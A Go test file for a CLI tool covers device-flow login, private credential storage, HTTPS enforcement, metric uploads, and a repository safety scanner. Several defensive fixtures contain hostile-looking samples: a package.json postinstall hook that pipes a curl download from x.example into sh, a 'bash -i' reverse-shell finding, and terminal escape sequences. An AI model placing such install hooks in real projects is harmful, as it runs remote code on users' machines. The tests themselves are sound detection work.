package cli

import (
	"context"
	"encoding/json"
	"io"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"sync/atomic"
	"testing"
	"time"

	"github.com/rburns629/urfluency-cli/safety"
	"github.com/rburns629/urfluency-cli/upload"
)

// fakeAPI serves the device flow and upload endpoints. The first token poll is
// pending; later polls return the token, or deny when deny is set.
func fakeAPI(t *testing.T, deny bool, uploaded chan<- *http.Request) *httptest.Server {
	t.Helper()
	var polls atomic.Int32
	mux := http.NewServeMux()
	mux.HandleFunc("POST /v1/auth/device", func(w http.ResponseWriter, r *http.Request) {
		var body map[string]string
		json.NewDecoder(r.Body).Decode(&body)
		if body["client"] != "urfluency-cli" || body["device"] != deviceName() {
			t.Errorf("login started with %v, want the client and this machine's name", body)
		}
		json.NewEncoder(w).Encode(deviceStart{DeviceCode: "device-secret", UserCode: "ABCD-EFGH",
			VerificationURI: "https://urfluency.test/connect", VerificationURIComplete: "https://urfluency.test/connect?code=ABCD-EFGH", ExpiresIn: 60})
	})
	mux.HandleFunc("POST /v1/auth/device/token", func(w http.ResponseWriter, r *http.Request) {
		var body map[string]string
		json.NewDecoder(r.Body).Decode(&body)
		if body["device_code"] != "device-secret" {
			t.Errorf("polled with device code %q", body["device_code"])
		}
		w.Header().Set("Content-Type", "application/json")
		switch {
		case polls.Add(1) == 1:
			w.WriteHeader(http.StatusBadRequest)
			json.NewEncoder(w).Encode(apiError{Error: "authorization_pending"})
		case deny:
			w.WriteHeader(http.StatusBadRequest)
			json.NewEncoder(w).Encode(apiError{Error: "access_denied"})
		default:
			json.NewEncoder(w).Encode(deviceToken{AccessToken: "upload-token", ExpiresIn: 3600})
		}
	})
	mux.HandleFunc("POST /v1/metrics", func(w http.ResponseWriter, r *http.Request) {
		if r.Header.Get("Authorization") != "Bearer upload-token" {
			w.WriteHeader(http.StatusUnauthorized)
			return
		}
		var p upload.Payload
		if err := json.NewDecoder(r.Body).Decode(&p); err != nil {
			t.Errorf("decode upload: %v", err)
		}
		if err := upload.Validate(p); err != nil {
			t.Errorf("uploaded payload fails validation: %v", err)
		}
		uploaded <- r
		w.WriteHeader(http.StatusCreated)
		json.NewEncoder(w).Encode(uploadResult{ProfileURL: "https://urfluency.test/u/me", Plan: "free"})
	})
	mux.HandleFunc("GET /v1/plan", func(w http.ResponseWriter, r *http.Request) {
		if r.Header.Get("Authorization") != "Bearer upload-token" {
			w.WriteHeader(http.StatusUnauthorized)
			return
		}
		json.NewEncoder(w).Encode(map[string]string{"plan": "pro"})
	})
	srv := httptest.NewServer(mux)
	t.Cleanup(srv.Close)
	return srv
}

func useAPI(t *testing.T, url string) {
	t.Setenv("URFLUENCY_API_URL", url)
	old := pollInterval
	pollInterval = time.Millisecond
	t.Cleanup(func() { pollInterval = old })
	path, _ := credentialsPath()
	t.Cleanup(func() { os.Remove(path) })
}

func TestLoginSavesTokenPrivately(t *testing.T) {
	srv := fakeAPI(t, false, nil)
	useAPI(t, srv.URL)
	var out strings.Builder
	if err := login(context.Background(), nil, &out); err != nil {
		t.Fatalf("login: %v", err)
	}
	if !strings.Contains(out.String(), "connect?code=ABCD-EFGH") || strings.Contains(out.String(), "upload-token") {
		t.Errorf("output should show the approval link and never the token:\n%s", out.String())
	}
	path, _ := credentialsPath()
	info, err := os.Stat(path)
	if err != nil {
		t.Fatal(err)
	}
	if info.Mode().Perm() != 0o600 {
		t.Errorf("credentials mode = %v, want 0600", info.Mode().Perm())
	}
	c, err := loadCredentials()
	if err != nil || c.Token != "upload-token" || c.API != srv.URL {
		t.Errorf("credentials = %+v, %v", c, err)
	}
	if err := logout(nil, &out); err != nil {
		t.Fatal(err)
	}
	if _, err := loadCredentials(); err == nil {
		t.Error("credentials survived logout")
	}
}

// The machine's name is the hostname unless URFLUENCY_DEVICE_NAME is set; set
// to empty, no name is sent. Login says which name it sent.
func TestLoginDeviceName(t *testing.T) {
	srv := fakeAPI(t, false, nil)
	useAPI(t, srv.URL)
	t.Setenv("URFLUENCY_DEVICE_NAME", "  work laptop ")
	var out strings.Builder
	if err := login(context.Background(), nil, &out); err != nil {
		t.Fatalf("login: %v", err)
	}
	if !strings.Contains(out.String(), `as "work laptop"`) {
		t.Errorf("login should name the machine it reported:\n%s", out.String())
	}

	t.Setenv("URFLUENCY_DEVICE_NAME", "")
	out.Reset()
	if err := login(context.Background(), nil, &out); err != nil {
		t.Fatalf("login: %v", err)
	}
	if deviceName() != "" || strings.Contains(out.String(), "list this machine") {
		t.Errorf("an empty URFLUENCY_DEVICE_NAME should send and print no name (%q):\n%s", deviceName(), out.String())
	}

	os.Unsetenv("URFLUENCY_DEVICE_NAME") // t.Setenv restores it afterwards
	if host, _ := os.Hostname(); deviceName() != strings.TrimSuffix(strings.TrimSuffix(host, "."), ".local") {
		t.Errorf("deviceName() = %q, want the hostname %q without .local", deviceName(), host)
	}
}

func TestLoginDenied(t *testing.T) {
	srv := fakeAPI(t, true, nil)
	useAPI(t, srv.URL)
	var out strings.Builder
	if err := login(context.Background(), nil, &out); err == nil || !strings.Contains(err.Error(), "denied") {
		t.Fatalf("login = %v, want denied", err)
	}
	if _, err := loadCredentials(); err == nil {
		t.Error("a denied login saved credentials")
	}
}

func TestAPIBaseRequiresHTTPS(t *testing.T) {
	for url, ok := range map[string]bool{"": true, "https://api.example.com": true, "http://localhost:8080": true, "http://api.example.com": false, "ftp://x": false} {
		t.Setenv("URFLUENCY_API_URL", url)
		if _, err := apiBase(); (err == nil) != ok {
			t.Errorf("apiBase(%q) error = %v, want ok=%v", url, err, ok)
		}
	}
}

func TestUpload(t *testing.T) {
	dir := t.TempDir()
	os.WriteFile(filepath.Join(dir, "go.mod"), []byte("module example.com/demo\n"), 0o644)
	os.WriteFile(filepath.Join(dir, "main.go"), []byte("package main\n\nimport \"fmt\"\n\nfunc main() {\n\tfmt.Println(\"hi\")\n}\n"), 0o644)

	var out, errOut strings.Builder
	if err := uploadCmd(context.Background(), []string{"--dry-run", dir}, &out, &errOut); err != nil {
		t.Fatalf("dry run: %v", err)
	}
	var p upload.Payload
	if err := json.Unmarshal([]byte(out.String()), &p); err != nil {
		t.Fatalf("dry run printed %q: %v", out.String(), err)
	}
	if p.Tier != upload.Declared || strings.Contains(out.String(), dir) {
		t.Errorf("dry run payload: tier %q, mentions the scanned path: %v", p.Tier, strings.Contains(out.String(), dir))
	}

	uploaded := make(chan *http.Request, 1)
	srv := fakeAPI(t, false, uploaded)
	useAPI(t, srv.URL)
	if err := uploadCmd(context.Background(), []string{"--yes", dir}, &out, &errOut); err == nil || !strings.Contains(err.Error(), "login") {
		t.Fatalf("upload without login = %v, want a login error", err)
	}
	if err := (credentials{API: srv.URL, Token: "upload-token", Expires: time.Now().Add(time.Hour)}).save(); err != nil {
		t.Fatal(err)
	}
	out.Reset()
	if err := uploadCmd(context.Background(), []string{"--yes", dir}, &out, &errOut); err != nil {
		t.Fatalf("upload: %v", err)
	}
	select {
	case <-uploaded:
	default:
		t.Fatal("nothing was uploaded")
	}
	if !strings.Contains(out.String(), "This upload contains") || !strings.Contains(out.String(), "https://urfluency.test/u/me") || !strings.Contains(out.String(), proNote) {
		t.Errorf("upload output:\n%s", out.String())
	}
}

func TestCheckLocalPath(t *testing.T) {
	dir := t.TempDir()
	os.WriteFile(filepath.Join(dir, "package.json"), []byte(`{"scripts":{"postinstall":"curl https://x.example/p | sh"}}`), 0o644)
	var out, errOut strings.Builder
	if err := check(context.Background(), []string{dir}, &out, &errOut); err != nil {
		t.Fatal(err)
	}
	for _, want := range []string{"High-risk indicators", "Runs a script when the package is installed", "package.json:1", "cannot prove a repository is safe"} {
		if !strings.Contains(out.String(), want) {
			t.Errorf("check output missing %q:\n%s", want, out.String())
		}
	}
	if err := check(context.Background(), []string{"http://github.com/o/r"}, &out, &errOut); err == nil {
		t.Error("check accepted a non-https URL")
	}
}

// status reports the login and the plan, and never fails: not logged in, a
// revoked token, and an unreachable API are each a line of output.
func TestStatus(t *testing.T) {
	srv := fakeAPI(t, false, nil)
	useAPI(t, srv.URL)
	run := func() string {
		t.Helper()
		var out strings.Builder
		if err := status(context.Background(), nil, &out); err != nil {
			t.Fatalf("status: %v", err)
		}
		return out.String()
	}
	if got := run(); !strings.Contains(got, "not logged in") {
		t.Errorf("logged out:\n%s", got)
	}
	expires := time.Now().Add(48 * time.Hour)
	if err := (credentials{API: srv.URL, Token: "upload-token", Expires: expires}).save(); err != nil {
		t.Fatal(err)
	}
	if got := run(); !strings.Contains(got, "Plan: Pro.") || !strings.Contains(got, expires.Format("2006-01-02")) || strings.Contains(got, proNote) {
		t.Errorf("pro:\n%s", got)
	}
	if err := (credentials{API: srv.URL, Token: "revoked", Expires: expires}).save(); err != nil {
		t.Fatal(err)
	}
	if got := run(); !strings.Contains(got, "run urfluency login") {
		t.Errorf("revoked:\n%s", got)
	}
	if err := (credentials{API: "http://127.0.0.1:1", Token: "upload-token", Expires: expires}).save(); err != nil {
		t.Fatal(err)
	}
	if got := run(); !strings.Contains(got, "Plan: unknown") {
		t.Errorf("unreachable:\n%s", got)
	}
	if err := status(context.Background(), []string{"x"}, io.Discard); err == nil {
		t.Error("status accepted an argument")
	}
}

func TestCheckEscapesControlCharactersFromTheRepository(t *testing.T) {
	var out strings.Builder
	writeSafety(&out, "repo", safety.Report{Verdict: safety.HighRisk, Findings: []safety.Finding{{
		Severity: safety.High, Confidence: safety.Likely, Title: "Reverse shell",
		Path: "a\x1b[2K\x1b[1Ab.sh", Line: 1, Evidence: "bash -i\x1b]0;clean\x07", Why: "why",
	}}})
	if strings.ContainsRune(out.String(), 0x1b) || !strings.Contains(out.String(), `a\x1b[2K\x1b[1Ab.sh:1`) {
		t.Errorf("control characters reached the terminal:\n%q", out.String())
	}
}

// A redirect to another origin is refused, so the token never reaches it.
func TestTokensDoNotFollowRedirectsToOtherOrigins(t *testing.T) {
	var leaked atomic.Bool
	other := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.Header.Get("Authorization") != "" {
			leaked.Store(true)
		}
	}))
	defer other.Close()
	api := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		http.Redirect(w, r, other.URL+"/steal", http.StatusTemporaryRedirect)
	}))
	defer api.Close()
	if _, _, err := postJSON(context.Background(), api.URL+"/v1/upload", "secret-token", map[string]string{}, nil); err == nil {
		t.Error("a redirect to another origin was followed")
	}
	if leaked.Load() {
		t.Error("the token reached the other origin")
	}
}

// scriptedLogin serves a device flow that starts with expiresIn and answers
// each token request with the next of answers, an error code or "ok".
func scriptedLogin(t *testing.T, expiresIn int, answers ...string) error {
	t.Helper()
	var next atomic.Int32
	mux := http.NewServeMux()
	mux.HandleFunc("POST /v1/auth/device", func(w http.ResponseWriter, r *http.Request) {
		json.NewEncoder(w).Encode(map[string]any{"device_code": "dev", "user_code": "ABCD", "verification_uri": "https://x.test/connect", "expires_in": expiresIn, "interval": 0})
	})
	mux.HandleFunc("POST /v1/auth/device/token", func(w http.ResponseWriter, r *http.Request) {
		i := int(next.Add(1)) - 1
		switch a := answers[min(i, len(answers)-1)]; a {
		case "ok":
			json.NewEncoder(w).Encode(map[string]any{"access_token": "upload-token", "expires_in": 3600})
		case "ok-without-expiry":
			json.NewEncoder(w).Encode(map[string]any{"access_token": "upload-token"})
		default:
			w.WriteHeader(http.StatusBadRequest)
			json.NewEncoder(w).Encode(map[string]string{"error": a})
		}
	})
	srv := httptest.NewServer(mux)
	defer srv.Close()
	useAPI(t, srv.URL)
	defer func(s time.Duration) { slowDownStep = s }(slowDownStep)
	slowDownStep = time.Millisecond
	return login(context.Background(), nil, io.Discard)
}

func TestLoginFlowAnswers(t *testing.T) {
	if err := scriptedLogin(t, 600, "authorization_pending", "slow_down", "ok"); err != nil {
		t.Errorf("pending, slow_down, then a token: %v", err)
	}
	if err := logout(nil, io.Discard); err != nil {
		t.Fatal(err)
	}
	if err := scriptedLogin(t, 600, "expired_token"); err == nil || !strings.Contains(err.Error(), "expired") {
		t.Errorf("expired_token: %v", err)
	}
	if err := scriptedLogin(t, 0, "ok"); err == nil || !strings.Contains(err.Error(), "expiry") {
		t.Errorf("a start without expires_in: %v", err)
	}
	if err := scriptedLogin(t, 600, "ok-without-expiry"); err == nil || !strings.Contains(err.Error(), "expiry") {
		t.Errorf("a token without expires_in: %v", err)
	}
	if _, err := loadCredentials(); err == nil {
		t.Error("a login without an expiry saved credentials")
	}
}

func TestErrorResponsesThatAreNotJSON(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusBadGateway)
		io.WriteString(w, "<html>Bad gateway</html>")
	}))
	defer srv.Close()
	status, code, err := postJSON(context.Background(), srv.URL, "", map[string]string{}, nil)
	if err != nil || status != http.StatusBadGateway || code != "unexpected response" {
		t.Errorf("got %d %q %v, want 502 and a code that says so", status, code, err)
	}
}
